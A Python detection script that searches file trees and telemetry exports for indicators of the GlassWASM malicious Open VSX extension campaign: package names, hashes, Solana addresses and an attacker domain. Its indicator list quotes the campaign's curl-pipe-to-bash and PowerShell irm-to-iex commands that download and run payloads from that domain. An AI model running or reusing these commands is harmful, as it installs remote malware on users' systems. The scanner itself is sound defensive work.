#!/usr/bin/env python3
"""Scope GlassWASM Open VSX indicators in local trees and telemetry exports."""

import argparse
import json
import os
from pathlib import Path
from typing import Iterable

PACKAGE_IDS = [
    "exargd/vsblack@0.0.1",
    "noellee-doc/flint-debug@0.1.1",
    "vscode/exargd/vsblack@0.0.1",
    "vscode/noellee-doc/flint-debug@0.1.1",
    "exargd.vsblack-0.0.1.vsix",
    "noellee-doc.flint-debug-0.1.1.vsix",
]

PUBLISHER_AND_SOURCE_SELECTORS = [
    "zaitoona43",
    "291961103",
    "https://github.com/zaitoona43",
    "https://open-vsx.org/extension/exargd/vsblack",
    "https://open-vsx.org/extension/noellee-doc/flint-debug",
    "https://socket.dev/blog/glasswasm-malware-open-vsx-extensions",
    "https://github.com/ExarGD/VSBlack-Theme",
    "https://github.com/noellee/vscode-flint-debug",
]

FILE_AND_HASH_SELECTORS = [
    "orybbbdsuqmaapel.wasm",
    "snqpkebiwrxmoivl.wasm",
    "558b4f1d9a263c13756ab0126c09dd080c85ba405b29488e1c4e6aa68b554f1f",
    "8ebac142e34a20c297d3ccaca7ee5d9ddd24fed4",
    "4e143876eeaf5e767a9971f603b0f13c",
    "3aa31999398e7f80231c03d7137ffdb554a84b83dbcffc59ce16c9a65f9e5d58",
    "c0ed7d575fe8085e942898c9a26f15992c895ba9",
    "b262b8d2ac2f0ab3c78251db44ecf3ac",
    "1e283327ad048bea39f4a8501770858a20f3555e87fe3e202274f2e87f8a3c25",
    "824e601b599b9ad97ee12f0b3a72efd20ba59d47",
    "f595fb7867beb76b4deab53fa328e0a2",
]

NETWORK_AND_RUNTIME_SELECTORS = [
    "api.mainnet.solana.com",
    "https://api.mainnet.solana.com",
    "dodod.lat",
    "https://dodod.lat/darwin/i/_",
    "https://dodod.lat/linux/i/_",
    "https://dodod.lat/win32/i/_",
    "6ExrZayPZzMMSnszc42cH81DpuKT8FhCX9H6Sesn6rpz",
    "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr",
    "Memo1UhkJRfHyvLMcVucJwxXeuD728EqVDDwQDxFM",
    "[9] dodod.lat",
    "getSignaturesForAddress",
    "getTransaction",
    "jsonParsed",
    "require('child_process')",
    "execSync",
    "windowsHide",
    "curl -fsSL https://dodod.lat/darwin/i/_ | bash",
    "curl -fsSL https://dodod.lat/linux/i/_ | bash",
    'powershell -Command "irm https://dodod.lat/win32/i/_ | iex"',
]

INDICATORS = sorted(
    {
        *PACKAGE_IDS,
        *PUBLISHER_AND_SOURCE_SELECTORS,
        *FILE_AND_HASH_SELECTORS,
        *NETWORK_AND_RUNTIME_SELECTORS,
    }
)


def write_indicator_file(out_dir: Path, indicators: Iterable[str]) -> Path:
    out_dir.mkdir(parents=True, exist_ok=True)
    indicator_file = out_dir / "ioc-indicators.txt"
    indicator_file.write_text("".join(f"{item}\n" for item in sorted(set(indicators))), encoding="utf-8")
    return indicator_file


def scan_tree(root: Path, indicators: Iterable[str]) -> list[str]:
    matches: list[str] = []
    if not root.exists():
        return matches

    exclude_dirs = {".git", "node_modules", "dist", "vendor", "__pycache__", ".venv"}
    indicator_list = list(indicators)

    for path in root.rglob("*"):
        if any(part in exclude_dirs for part in path.parts):
            continue
        if not path.is_file():
            continue
        try:
            content = path.read_text(encoding="utf-8", errors="ignore")
        except Exception:
            continue
        for indicator in indicator_list:
            if indicator in content:
                matches.append(f"{path}: found '{indicator}'")
    return matches


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("root", nargs="?", default=".", help="directory tree to scan")
    parser.add_argument("--telemetry-root", default=os.environ.get("LOG_ROOT", ""), help="optional telemetry/export directory to scan")
    parser.add_argument("--out", default=os.environ.get("OUT", "hp-glasswasm-open-vsx-extensions-scope"), help="output directory")
    args = parser.parse_args()

    root = Path(args.root).resolve()
    telemetry_root = Path(args.telemetry_root).resolve() if args.telemetry_root else None
    out_dir = Path(args.out).resolve()

    indicator_file = write_indicator_file(out_dir, INDICATORS)
    repo_matches = scan_tree(root, INDICATORS)
    if repo_matches:
        (out_dir / "repository-indicator-matches.txt").write_text("\n".join(repo_matches) + "\n", encoding="utf-8")

    telemetry_matches: list[str] = []
    if telemetry_root and telemetry_root.exists():
        telemetry_matches = scan_tree(telemetry_root, INDICATORS)
        if telemetry_matches:
            (out_dir / "exported-telemetry-indicator-matches.txt").write_text("\n".join(telemetry_matches) + "\n", encoding="utf-8")

    summary = {
        "root": str(root),
        "telemetry_root": str(telemetry_root) if telemetry_root else None,
        "out_dir": str(out_dir),
        "indicator_file": str(indicator_file),
        "repository_match_count": len(repo_matches),
        "telemetry_match_count": len(telemetry_matches),
    }
    (out_dir / "scan-summary.json").write_text(json.dumps(summary, indent=2, sort_keys=True) + "\n", encoding="utf-8")

    print(f"[+] Wrote indicator file: {indicator_file}")
    print(f"[+] Repository matches: {len(repo_matches)}")
    if telemetry_root and telemetry_root.exists():
        print(f"[+] Telemetry matches: {len(telemetry_matches)}")
    print(f"[+] Summary written to: {out_dir / 'scan-summary.json'}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
